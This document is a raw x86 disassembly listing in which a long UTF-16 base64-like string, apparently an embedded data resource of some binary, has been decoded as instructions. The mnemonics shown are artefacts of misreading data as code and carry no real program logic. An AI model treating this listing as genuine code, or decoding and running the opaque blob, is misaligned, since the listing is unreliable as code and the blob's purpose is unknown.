  40a9cd:	00 73 00             	add    %dh,0x0(%ebx)
  40a9d0:	49                   	dec    %ecx
  40a9d1:	00 52 00             	add    %dl,0x0(%edx)
  40a9d4:	72 00                	jb     0x40a9d6
  40a9d6:	72 00                	jb     0x40a9d8
  40a9d8:	74 00                	je     0x40a9da
  40a9da:	45                   	inc    %ebp
  40a9db:	00 62 00             	add    %ah,0x0(%edx)
  40a9de:	37                   	aaa
  40a9df:	00 35 00 79 00 73    	add    %dh,0x73007900
  40a9e5:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a9e9:	00 61 00             	add    %ah,0x0(%ecx)
  40a9ec:	53                   	push   %ebx
  40a9ed:	00 39                	add    %bh,(%ecx)
  40a9ef:	00 63 00             	add    %ah,0x0(%ebx)
  40a9f2:	58                   	pop    %eax
  40a9f3:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40a9f7:	00 61 00             	add    %ah,0x0(%ecx)
  40a9fa:	4d                   	dec    %ebp
  40a9fb:	00 37                	add    %dh,(%edi)
  40a9fd:	00 69 00             	add    %ch,0x0(%ecx)
  40aa00:	6a 00                	push   $0x0
  40aa02:	74 00                	je     0x40aa04
  40aa04:	66 00 2b             	data16 add %ch,(%ebx)
  40aa07:	00 37                	add    %dh,(%edi)
  40aa09:	00 4f 00             	add    %cl,0x0(%edi)
  40aa0c:	45                   	inc    %ebp
  40aa0d:	00 65 00             	add    %ah,0x0(%ebp)
  40aa10:	5a                   	pop    %edx
  40aa11:	00 47 00             	add    %al,0x0(%edi)
  40aa14:	74 00                	je     0x40aa16
  40aa16:	31 00                	xor    %eax,(%eax)
  40aa18:	31 00                	xor    %eax,(%eax)
  40aa1a:	4c                   	dec    %esp
  40aa1b:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40aa1f:	00 32                	add    %dh,(%edx)
  40aa21:	00 37                	add    %dh,(%edi)
  40aa23:	00 68 00             	add    %ch,0x0(%eax)
  40aa26:	6b 00 54             	imul   $0x54,(%eax),%eax
  40aa29:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40aa2d:	00 79 00             	add    %bh,0x0(%ecx)
  40aa30:	6c                   	insb   (%dx),%es:(%edi)
  40aa31:	00 4f 00             	add    %cl,0x0(%edi)
  40aa34:	44                   	inc    %esp
  40aa35:	00 42 00             	add    %al,0x0(%edx)
  40aa38:	70 00                	jo     0x40aa3a
  40aa3a:	79 00                	jns    0x40aa3c
  40aa3c:	63 00                	arpl   %eax,(%eax)
  40aa3e:	4a                   	dec    %edx
  40aa3f:	00 6f 00             	add    %ch,0x0(%edi)
  40aa42:	31 00                	xor    %eax,(%eax)
  40aa44:	6c                   	insb   (%dx),%es:(%edi)
  40aa45:	00 6f 00             	add    %ch,0x0(%edi)
  40aa48:	52                   	push   %edx
  40aa49:	00 56 00             	add    %dl,0x0(%esi)
  40aa4c:	52                   	push   %edx
  40aa4d:	00 4f 00             	add    %cl,0x0(%edi)
  40aa50:	56                   	push   %esi
  40aa51:	00 77 00             	add    %dh,0x0(%edi)
  40aa54:	77 00                	ja     0x40aa56
  40aa56:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40aa5a:	6d                   	insl   (%dx),%es:(%edi)
  40aa5b:	00 48 00             	add    %cl,0x0(%eax)
  40aa5e:	46                   	inc    %esi
  40aa5f:	00 75 00             	add    %dh,0x0(%ebp)
  40aa62:	68 00 73 00 5a       	push   $0x5a007300
  40aa67:	00 52 00             	add    %dl,0x0(%edx)
  40aa6a:	39 00                	cmp    %eax,(%eax)
  40aa6c:	32 00                	xor    (%eax),%al
  40aa6e:	79 00                	jns    0x40aa70
  40aa70:	70 00                	jo     0x40aa72
  40aa72:	4e                   	dec    %esi
  40aa73:	00 2f                	add    %ch,(%edi)
  40aa75:	00 30                	add    %dh,(%eax)
  40aa77:	00 67 00             	add    %ah,0x0(%edi)
  40aa7a:	30 00                	xor    %al,(%eax)
  40aa7c:	75 00                	jne    0x40aa7e
  40aa7e:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40aa82:	6b 00 79             	imul   $0x79,(%eax),%eax
  40aa85:	00 47 00             	add    %al,0x0(%edi)
  40aa88:	48                   	dec    %eax
  40aa89:	00 63 00             	add    %ah,0x0(%ebx)
  40aa8c:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40aa90:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40aa94:	45                   	inc    %ebp
  40aa95:	00 45 00             	add    %al,0x0(%ebp)
  40aa98:	38 00                	cmp    %al,(%eax)
  40aa9a:	39 00                	cmp    %eax,(%eax)
  40aa9c:	78 00                	js     0x40aa9e
  40aa9e:	79 00                	jns    0x40aaa0
  40aaa0:	7a 00                	jp     0x40aaa2
  40aaa2:	35 00 66 00 42       	xor    $0x42006600,%eax
  40aaa7:	00 6a 00             	add    %ch,0x0(%edx)
  40aaaa:	37                   	aaa
  40aaab:	00 71 00             	add    %dh,0x0(%ecx)
  40aaae:	4f                   	dec    %edi
  40aaaf:	00 36                	add    %dh,(%esi)
  40aab1:	00 6f 00             	add    %ch,0x0(%edi)
  40aab4:	73 00                	jae    0x40aab6
  40aab6:	4f                   	dec    %edi
  40aab7:	00 45 00             	add    %al,0x0(%ebp)
  40aaba:	68 00 4b 00 2f       	push   $0x2f004b00
  40aabf:	00 70 00             	add    %dh,0x0(%eax)
  40aac2:	6d                   	insl   (%dx),%es:(%edi)
  40aac3:	00 62 00             	add    %ah,0x0(%edx)
  40aac6:	50                   	push   %eax
  40aac7:	00 2f                	add    %ch,(%edi)
  40aac9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aacc:	69 00 37 00 4b 00    	imul   $0x4b0037,(%eax),%eax
  40aad2:	76 00                	jbe    0x40aad4
  40aad4:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40aad8:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40aadc:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40aae0:	4e                   	dec    %esi
  40aae1:	00 58 00             	add    %bl,0x0(%eax)
  40aae4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aae5:	00 6f 00             	add    %ch,0x0(%edi)
  40aae8:	58                   	pop    %eax
  40aae9:	00 72 00             	add    %dh,0x0(%edx)
  40aaec:	4d                   	dec    %ebp
  40aaed:	00 56 00             	add    %dl,0x0(%esi)
  40aaf0:	57                   	push   %edi
  40aaf1:	00 49 00             	add    %cl,0x0(%ecx)
  40aaf4:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40aaf8:	57                   	push   %edi
  40aaf9:	00 39                	add    %bh,(%ecx)
  40aafb:	00 37                	add    %dh,(%edi)
  40aafd:	00 42 00             	add    %al,0x0(%edx)
  40ab00:	6d                   	insl   (%dx),%es:(%edi)
  40ab01:	00 37                	add    %dh,(%edi)
  40ab03:	00 62 00             	add    %ah,0x0(%edx)
  40ab06:	4a                   	dec    %edx
  40ab07:	00 42 00             	add    %al,0x0(%edx)
  40ab0a:	54                   	push   %esp
  40ab0b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab0e:	47                   	inc    %edi
  40ab0f:	00 69 00             	add    %ch,0x0(%ecx)
  40ab12:	7a 00                	jp     0x40ab14
  40ab14:	76 00                	jbe    0x40ab16
  40ab16:	72 00                	jb     0x40ab18
  40ab18:	51                   	push   %ecx
  40ab19:	00 46 00             	add    %al,0x0(%esi)
  40ab1c:	74 00                	je     0x40ab1e
  40ab1e:	76 00                	jbe    0x40ab20
  40ab20:	62 00                	bound  %eax,(%eax)
  40ab22:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40ab26:	6b 00 72             	imul   $0x72,(%eax),%eax
  40ab29:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40ab2d:	00 46 00             	add    %al,0x0(%esi)
  40ab30:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab31:	00 43 00             	add    %al,0x0(%ebx)
  40ab34:	72 00                	jb     0x40ab36
  40ab36:	6d                   	insl   (%dx),%es:(%edi)
  40ab37:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40ab3b:	00 2b                	add    %ch,(%ebx)
  40ab3d:	00 36                	add    %dh,(%esi)
  40ab3f:	00 42 00             	add    %al,0x0(%edx)
  40ab42:	56                   	push   %esi
  40ab43:	00 50 00             	add    %dl,0x0(%eax)
  40ab46:	4d                   	dec    %ebp
  40ab47:	00 35 00 33 00 57    	add    %dh,0x57003300
  40ab4d:	00 68 00             	add    %ch,0x0(%eax)
  40ab50:	4c                   	dec    %esp
  40ab51:	00 52 00             	add    %dl,0x0(%edx)
  40ab54:	33 00                	xor    (%eax),%eax
  40ab56:	49                   	dec    %ecx
  40ab57:	00 46 00             	add    %al,0x0(%esi)
  40ab5a:	4f                   	dec    %edi
  40ab5b:	00 69 00             	add    %ch,0x0(%ecx)
  40ab5e:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40ab62:	6c                   	insb   (%dx),%es:(%edi)
  40ab63:	00 32                	add    %dh,(%edx)
  40ab65:	00 62 00             	add    %ah,0x0(%edx)
  40ab68:	67 00 47 00          	add    %al,0x0(%bx)
  40ab6c:	39 00                	cmp    %eax,(%eax)
  40ab6e:	47                   	inc    %edi
  40ab6f:	00 4f 00             	add    %cl,0x0(%edi)
  40ab72:	39 00                	cmp    %eax,(%eax)
  40ab74:	7a 00                	jp     0x40ab76
  40ab76:	76 00                	jbe    0x40ab78
  40ab78:	4f                   	dec    %edi
  40ab79:	00 52 00             	add    %dl,0x0(%edx)
  40ab7c:	52                   	push   %edx
  40ab7d:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40ab81:	00 42 00             	add    %al,0x0(%edx)
  40ab84:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40ab88:	42                   	inc    %edx
  40ab89:	00 4a 00             	add    %cl,0x0(%edx)
  40ab8c:	72 00                	jb     0x40ab8e
  40ab8e:	6c                   	insb   (%dx),%es:(%edi)
  40ab8f:	00 7a 00             	add    %bh,0x0(%edx)
  40ab92:	52                   	push   %edx
  40ab93:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40ab97:	00 67 00             	add    %ah,0x0(%edi)
  40ab9a:	4b                   	dec    %ebx
  40ab9b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab9e:	79 00                	jns    0x40aba0
  40aba0:	50                   	push   %eax
  40aba1:	00 63 00             	add    %ah,0x0(%ebx)
  40aba4:	57                   	push   %edi
  40aba5:	00 41 00             	add    %al,0x0(%ecx)
  40aba8:	4c                   	dec    %esp
  40aba9:	00 35 00 49 00 63    	add    %dh,0x63004900
  40abaf:	00 58 00             	add    %bl,0x0(%eax)
  40abb2:	59                   	pop    %ecx
  40abb3:	00 5a 00             	add    %bl,0x0(%edx)
  40abb6:	77 00                	ja     0x40abb8
  40abb8:	6e                   	outsb  %ds:(%esi),(%dx)
  40abb9:	00 6a 00             	add    %ch,0x0(%edx)
  40abbc:	7a 00                	jp     0x40abbe
  40abbe:	33 00                	xor    (%eax),%eax
  40abc0:	43                   	inc    %ebx
  40abc1:	00 6a 00             	add    %ch,0x0(%edx)
  40abc4:	61                   	popa
  40abc5:	00 61 00             	add    %ah,0x0(%ecx)
  40abc8:	6e                   	outsb  %ds:(%esi),(%dx)
  40abc9:	00 41 00             	add    %al,0x0(%ecx)
  40abcc:	36 00 35 00 62 00 2b 	add    %dh,%ss:0x2b006200
  40abd3:	00 6a 00             	add    %ch,0x0(%edx)
  40abd6:	6d                   	insl   (%dx),%es:(%edi)
  40abd7:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40abdb:	00 77 00             	add    %dh,0x0(%edi)
  40abde:	71 00                	jno    0x40abe0
  40abe0:	55                   	push   %ebp
  40abe1:	00 43 00             	add    %al,0x0(%ebx)
  40abe4:	35 00 4a 00 6f       	xor    $0x6f004a00,%eax
  40abe9:	00 59 00             	add    %bl,0x0(%ecx)
  40abec:	58                   	pop    %eax
  40abed:	00 76 00             	add    %dh,0x0(%esi)
  40abf0:	39 00                	cmp    %eax,(%eax)
  40abf2:	76 00                	jbe    0x40abf4
  40abf4:	63 00                	arpl   %eax,(%eax)
  40abf6:	45                   	inc    %ebp
  40abf7:	00 58 00             	add    %bl,0x0(%eax)
  40abfa:	76 00                	jbe    0x40abfc
  40abfc:	6d                   	insl   (%dx),%es:(%edi)
  40abfd:	00 59 00             	add    %bl,0x0(%ecx)
  40ac00:	69 00 54 00 34 00    	imul   $0x340054,(%eax),%eax
  40ac06:	4f                   	dec    %edi
  40ac07:	00 4e 00             	add    %cl,0x0(%esi)
  40ac0a:	55                   	push   %ebp
  40ac0b:	00 2b                	add    %ch,(%ebx)
  40ac0d:	00 52 00             	add    %dl,0x0(%edx)
  40ac10:	38 00                	cmp    %al,(%eax)
  40ac12:	50                   	push   %eax
  40ac13:	00 47 00             	add    %al,0x0(%edi)
  40ac16:	58                   	pop    %eax
  40ac17:	00 42 00             	add    %al,0x0(%edx)
  40ac1a:	53                   	push   %ebx
  40ac1b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac1e:	4e                   	dec    %esi
  40ac1f:	00 55 00             	add    %dl,0x0(%ebp)
  40ac22:	38 00                	cmp    %al,(%eax)
  40ac24:	33 00                	xor    (%eax),%eax
  40ac26:	5a                   	pop    %edx
  40ac27:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40ac2b:	00 32                	add    %dh,(%edx)
  40ac2d:	00 33                	add    %dh,(%ebx)
  40ac2f:	00 39                	add    %bh,(%ecx)
  40ac31:	00 42 00             	add    %al,0x0(%edx)
  40ac34:	34 00                	xor    $0x0,%al
  40ac36:	4e                   	dec    %esi
  40ac37:	00 42 00             	add    %al,0x0(%edx)
  40ac3a:	61                   	popa
  40ac3b:	00 37                	add    %dh,(%edi)
  40ac3d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac40:	4d                   	dec    %ebp
  40ac41:	00 31                	add    %dh,(%ecx)
  40ac43:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40ac47:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40ac4b:	00 47 00             	add    %al,0x0(%edi)
  40ac4e:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40ac52:	59                   	pop    %ecx
  40ac53:	00 38                	add    %bh,(%eax)
  40ac55:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40ac59:	00 51 00             	add    %dl,0x0(%ecx)
  40ac5c:	68 00 42 00 2b       	push   $0x2b004200
  40ac61:	00 66 00             	add    %ah,0x0(%esi)
  40ac64:	2b 00                	sub    (%eax),%eax
  40ac66:	31 00                	xor    %eax,(%eax)
  40ac68:	31 00                	xor    %eax,(%eax)
  40ac6a:	57                   	push   %edi
  40ac6b:	00 7a 00             	add    %bh,0x0(%edx)
  40ac6e:	32 00                	xor    (%eax),%al
  40ac70:	71 00                	jno    0x40ac72
  40ac72:	56                   	push   %esi
  40ac73:	00 37                	add    %dh,(%edi)
  40ac75:	00 4e 00             	add    %cl,0x0(%esi)
  40ac78:	44                   	inc    %esp
  40ac79:	00 50 00             	add    %dl,0x0(%eax)
  40ac7c:	43                   	inc    %ebx
  40ac7d:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40ac81:	00 43 00             	add    %al,0x0(%ebx)
  40ac84:	6c                   	insb   (%dx),%es:(%edi)
  40ac85:	00 62 00             	add    %ah,0x0(%edx)
  40ac88:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac89:	00 37                	add    %dh,(%edi)
  40ac8b:	00 4a 00             	add    %cl,0x0(%edx)
  40ac8e:	36 00 33             	add    %dh,%ss:(%ebx)
  40ac91:	00 48 00             	add    %cl,0x0(%eax)
  40ac94:	63 00                	arpl   %eax,(%eax)
  40ac96:	6a 00                	push   $0x0
  40ac98:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac99:	00 4f 00             	add    %cl,0x0(%edi)
  40ac9c:	55                   	push   %ebp
  40ac9d:	00 4d 00             	add    %cl,0x0(%ebp)
  40aca0:	4b                   	dec    %ebx
  40aca1:	00 59 00             	add    %bl,0x0(%ecx)
  40aca4:	46                   	inc    %esi
  40aca5:	00 67 00             	add    %ah,0x0(%edi)
  40aca8:	2b 00                	sub    (%eax),%eax
  40acaa:	69 00 57 00 74 00    	imul   $0x740057,(%eax),%eax
  40acb0:	33 00                	xor    (%eax),%eax
  40acb2:	30 00                	xor    %al,(%eax)
  40acb4:	42                   	inc    %edx
  40acb5:	00 4b 00             	add    %cl,0x0(%ebx)
  40acb8:	46                   	inc    %esi
  40acb9:	00 75 00             	add    %dh,0x0(%ebp)
  40acbc:	61                   	popa
  40acbd:	00 4e 00             	add    %cl,0x0(%esi)
  40acc0:	6f                   	outsl  %ds:(%esi),(%dx)
  40acc1:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40acc5:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40acc9:	00 67 00             	add    %ah,0x0(%edi)
  40accc:	34 00                	xor    $0x0,%al
  40acce:	6a 00                	push   $0x0
  40acd0:	78 00                	js     0x40acd2
  40acd2:	6c                   	insb   (%dx),%es:(%edi)
  40acd3:	00 32                	add    %dh,(%edx)
  40acd5:	00 69 00             	add    %ch,0x0(%ecx)
  40acd8:	4c                   	dec    %esp
  40acd9:	00 59 00             	add    %bl,0x0(%ecx)
  40acdc:	6c                   	insb   (%dx),%es:(%edi)
  40acdd:	00 2b                	add    %ch,(%ebx)
  40acdf:	00 32                	add    %dh,(%edx)
  40ace1:	00 38                	add    %bh,(%eax)
  40ace3:	00 31                	add    %dh,(%ecx)
  40ace5:	00 6e 00             	add    %ch,0x0(%esi)
  40ace8:	61                   	popa
  40ace9:	00 6a 00             	add    %ch,0x0(%edx)
  40acec:	2f                   	das
  40aced:	00 30                	add    %dh,(%eax)
  40acef:	00 59 00             	add    %bl,0x0(%ecx)
  40acf2:	59                   	pop    %ecx
  40acf3:	00 6b 00             	add    %ch,0x0(%ebx)
  40acf6:	6d                   	insl   (%dx),%es:(%edi)
  40acf7:	00 4f 00             	add    %cl,0x0(%edi)
  40acfa:	75 00                	jne    0x40acfc
  40acfc:	6e                   	outsb  %ds:(%esi),(%dx)
  40acfd:	00 77 00             	add    %dh,0x0(%edi)
  40ad00:	2f                   	das
  40ad01:	00 77 00             	add    %dh,0x0(%edi)
  40ad04:	57                   	push   %edi
  40ad05:	00 77 00             	add    %dh,0x0(%edi)
  40ad08:	59                   	pop    %ecx
  40ad09:	00 59 00             	add    %bl,0x0(%ecx)
  40ad0c:	4a                   	dec    %edx
  40ad0d:	00 42 00             	add    %al,0x0(%edx)
  40ad10:	63 00                	arpl   %eax,(%eax)
  40ad12:	6d                   	insl   (%dx),%es:(%edi)
  40ad13:	00 71 00             	add    %dh,0x0(%ecx)
  40ad16:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40ad19:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad1c:	7a 00                	jp     0x40ad1e
  40ad1e:	41                   	inc    %ecx
  40ad1f:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40ad23:	00 32                	add    %dh,(%edx)
  40ad25:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  40ad29:	00 76 00             	add    %dh,0x0(%esi)
  40ad2c:	5a                   	pop    %edx
  40ad2d:	00 53 00             	add    %dl,0x0(%ebx)
  40ad30:	2f                   	das
  40ad31:	00 45 00             	add    %al,0x0(%ebp)
  40ad34:	49                   	dec    %ecx
  40ad35:	00 36                	add    %dh,(%esi)
  40ad37:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad3a:	70 00                	jo     0x40ad3c
  40ad3c:	78 00                	js     0x40ad3e
  40ad3e:	37                   	aaa
  40ad3f:	00 53 00             	add    %dl,0x0(%ebx)
  40ad42:	4b                   	dec    %ebx
  40ad43:	00 2b                	add    %ch,(%ebx)
  40ad45:	00 49 00             	add    %cl,0x0(%ecx)
  40ad48:	2f                   	das
  40ad49:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad4c:	71 00                	jno    0x40ad4e
  40ad4e:	33 00                	xor    (%eax),%eax
  40ad50:	43                   	inc    %ebx
  40ad51:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad54:	58                   	pop    %eax
  40ad55:	00 75 00             	add    %dh,0x0(%ebp)
  40ad58:	55                   	push   %ebp
  40ad59:	00 72 00             	add    %dh,0x0(%edx)
  40ad5c:	74 00                	je     0x40ad5e
  40ad5e:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40ad61:	00 70 00             	add    %dh,0x0(%eax)
  40ad64:	6c                   	insb   (%dx),%es:(%edi)
  40ad65:	00 79 00             	add    %bh,0x0(%ecx)
  40ad68:	74 00                	je     0x40ad6a
  40ad6a:	73 00                	jae    0x40ad6c
  40ad6c:	63 00                	arpl   %eax,(%eax)
  40ad6e:	30 00                	xor    %al,(%eax)
  40ad70:	51                   	push   %ecx
  40ad71:	00 56 00             	add    %dl,0x0(%esi)
  40ad74:	49                   	dec    %ecx
  40ad75:	00 55 00             	add    %dl,0x0(%ebp)
  40ad78:	55                   	push   %ebp
  40ad79:	00 63 00             	add    %ah,0x0(%ebx)
  40ad7c:	53                   	push   %ebx
  40ad7d:	00 51 00             	add    %dl,0x0(%ecx)
  40ad80:	74 00                	je     0x40ad82
  40ad82:	7a 00                	jp     0x40ad84
  40ad84:	54                   	push   %esp
  40ad85:	00 63 00             	add    %ah,0x0(%ebx)
  40ad88:	38 00                	cmp    %al,(%eax)
  40ad8a:	4f                   	dec    %edi
  40ad8b:	00 33                	add    %dh,(%ebx)
  40ad8d:	00 79 00             	add    %bh,0x0(%ecx)
  40ad90:	73 00                	jae    0x40ad92
  40ad92:	5a                   	pop    %edx
  40ad93:	00 30                	add    %dh,(%eax)
  40ad95:	00 73 00             	add    %dh,0x0(%ebx)
  40ad98:	4b                   	dec    %ebx
  40ad99:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad9c:	45                   	inc    %ebp
  40ad9d:	00 79 00             	add    %bh,0x0(%ecx)
  40ada0:	57                   	push   %edi
  40ada1:	00 59 00             	add    %bl,0x0(%ecx)
  40ada4:	32 00                	xor    (%eax),%al
  40ada6:	57                   	push   %edi
  40ada7:	00 56 00             	add    %dl,0x0(%esi)
  40adaa:	73 00                	jae    0x40adac
  40adac:	4b                   	dec    %ebx
  40adad:	00 57 00             	add    %dl,0x0(%edi)
  40adb0:	70 00                	jo     0x40adb2
  40adb2:	72 00                	jb     0x40adb4
  40adb4:	52                   	push   %edx
  40adb5:	00 6d 00             	add    %ch,0x0(%ebp)
  40adb8:	74 00                	je     0x40adba
  40adba:	67 00 31             	add    %dh,(%bx,%di)
  40adbd:	00 6d 00             	add    %ch,0x0(%ebp)
  40adc0:	62 00                	bound  %eax,(%eax)
  40adc2:	31 00                	xor    %eax,(%eax)
  40adc4:	52                   	push   %edx
  40adc5:	00 31                	add    %dh,(%ecx)
  40adc7:	00 52 00             	add    %dl,0x0(%edx)
  40adca:	39 00                	cmp    %eax,(%eax)
  40adcc:	50                   	push   %eax
  40adcd:	00 33                	add    %dh,(%ebx)
  40adcf:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40add3:	00 69 00             	add    %ch,0x0(%ecx)
  40add6:	49                   	dec    %ecx
  40add7:	00 30                	add    %dh,(%eax)
  40add9:	00 78 00             	add    %bh,0x0(%eax)
  40addc:	4b                   	dec    %ebx
  40addd:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40ade1:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40ade5:	00 42 00             	add    %al,0x0(%edx)
  40ade8:	45                   	inc    %ebp
  40ade9:	00 33                	add    %dh,(%ebx)
  40adeb:	00 2f                	add    %ch,(%edi)
  40aded:	00 38                	add    %bh,(%eax)
  40adef:	00 6b 00             	add    %ch,0x0(%ebx)
  40adf2:	61                   	popa
  40adf3:	00 55 00             	add    %dl,0x0(%ebp)
  40adf6:	45                   	inc    %ebp
  40adf7:	00 32                	add    %dh,(%edx)
  40adf9:	00 59 00             	add    %bl,0x0(%ecx)
  40adfc:	76 00                	jbe    0x40adfe
  40adfe:	69 00 77 00 73 00    	imul   $0x730077,(%eax),%eax
  40ae04:	6c                   	insb   (%dx),%es:(%edi)
  40ae05:	00 47 00             	add    %al,0x0(%edi)
  40ae08:	76 00                	jbe    0x40ae0a
  40ae0a:	39 00                	cmp    %eax,(%eax)
  40ae0c:	2f                   	das
  40ae0d:	00 61 00             	add    %ah,0x0(%ecx)
  40ae10:	76 00                	jbe    0x40ae12
  40ae12:	72 00                	jb     0x40ae14
  40ae14:	61                   	popa
  40ae15:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40ae19:	00 52 00             	add    %dl,0x0(%edx)
  40ae1c:	56                   	push   %esi
  40ae1d:	00 4e 00             	add    %cl,0x0(%esi)
  40ae20:	71 00                	jno    0x40ae22
  40ae22:	50                   	push   %eax
  40ae23:	00 45 00             	add    %al,0x0(%ebp)
  40ae26:	42                   	inc    %edx
  40ae27:	00 79 00             	add    %bh,0x0(%ecx)
  40ae2a:	46                   	inc    %esi
  40ae2b:	00 66 00             	add    %ah,0x0(%esi)
  40ae2e:	55                   	push   %ebp
  40ae2f:	00 48 00             	add    %cl,0x0(%eax)
  40ae32:	48                   	dec    %eax
  40ae33:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae36:	44                   	inc    %esp
  40ae37:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40ae3b:	00 58 00             	add    %bl,0x0(%eax)
  40ae3e:	35 00 6e 00 47       	xor    $0x47006e00,%eax
  40ae43:	00 77 00             	add    %dh,0x0(%edi)
  40ae46:	53                   	push   %ebx
  40ae47:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae4a:	43                   	inc    %ebx
  40ae4b:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40ae4f:	00 72 00             	add    %dh,0x0(%edx)
  40ae52:	55                   	push   %ebp
  40ae53:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae56:	72 00                	jb     0x40ae58
  40ae58:	48                   	dec    %eax
  40ae59:	00 38                	add    %bh,(%eax)
  40ae5b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae5e:	48                   	dec    %eax
  40ae5f:	00 42 00             	add    %al,0x0(%edx)
  40ae62:	77 00                	ja     0x40ae64
  40ae64:	64 00 4c 00 4b       	add    %cl,%fs:0x4b(%eax,%eax,1)
  40ae69:	00 46 00             	add    %al,0x0(%esi)
  40ae6c:	49                   	dec    %ecx
  40ae6d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae70:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae71:	00 55 00             	add    %dl,0x0(%ebp)
  40ae74:	4f                   	dec    %edi
  40ae75:	00 6a 00             	add    %ch,0x0(%edx)
  40ae78:	56                   	push   %esi
  40ae79:	00 78 00             	add    %bh,0x0(%eax)
  40ae7c:	30 00                	xor    %al,(%eax)
  40ae7e:	4d                   	dec    %ebp
  40ae7f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae82:	4e                   	dec    %esi
  40ae83:	00 67 00             	add    %ah,0x0(%edi)
  40ae86:	2f                   	das
  40ae87:	00 68 00             	add    %ch,0x0(%eax)
  40ae8a:	69 00 74 00 73 00    	imul   $0x730074,(%eax),%eax
  40ae90:	66 00 36             	data16 add %dh,(%esi)
  40ae93:	00 45 00             	add    %al,0x0(%ebp)
  40ae96:	57                   	push   %edi
  40ae97:	00 5a 00             	add    %bl,0x0(%edx)
  40ae9a:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40ae9e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae9f:	00 6a 00             	add    %ch,0x0(%edx)
  40aea2:	47                   	inc    %edi
  40aea3:	00 75 00             	add    %dh,0x0(%ebp)
  40aea6:	70 00                	jo     0x40aea8
  40aea8:	54                   	push   %esp
  40aea9:	00 4f 00             	add    %cl,0x0(%edi)
  40aeac:	62 00                	bound  %eax,(%eax)
  40aeae:	6d                   	insl   (%dx),%es:(%edi)
  40aeaf:	00 41 00             	add    %al,0x0(%ecx)
  40aeb2:	46                   	inc    %esi
  40aeb3:	00 66 00             	add    %ah,0x0(%esi)
  40aeb6:	33 00                	xor    (%eax),%eax
  40aeb8:	4e                   	dec    %esi
  40aeb9:	00 51 00             	add    %dl,0x0(%ecx)
  40aebc:	74 00                	je     0x40aebe
  40aebe:	4b                   	dec    %ebx
  40aebf:	00 41 00             	add    %al,0x0(%ecx)
  40aec2:	62 00                	bound  %eax,(%eax)
  40aec4:	58                   	pop    %eax
  40aec5:	00 63 00             	add    %ah,0x0(%ebx)
  40aec8:	45                   	inc    %ebp
  40aec9:	00 41 00             	add    %al,0x0(%ecx)
  40aecc:	46                   	inc    %esi
  40aecd:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40aed1:	00 63 00             	add    %ah,0x0(%ebx)
  40aed4:	44                   	inc    %esp
  40aed5:	00 67 00             	add    %ah,0x0(%edi)
  40aed8:	76 00                	jbe    0x40aeda
  40aeda:	42                   	inc    %edx
  40aedb:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40aedf:	00 6b 00             	add    %ch,0x0(%ebx)
  40aee2:	41                   	inc    %ecx
  40aee3:	00 69 00             	add    %ch,0x0(%ecx)
  40aee6:	2f                   	das
  40aee7:	00 56 00             	add    %dl,0x0(%esi)
  40aeea:	62 00                	bound  %eax,(%eax)
  40aeec:	6a 00                	push   $0x0
  40aeee:	2f                   	das
  40aeef:	00 52 00             	add    %dl,0x0(%edx)
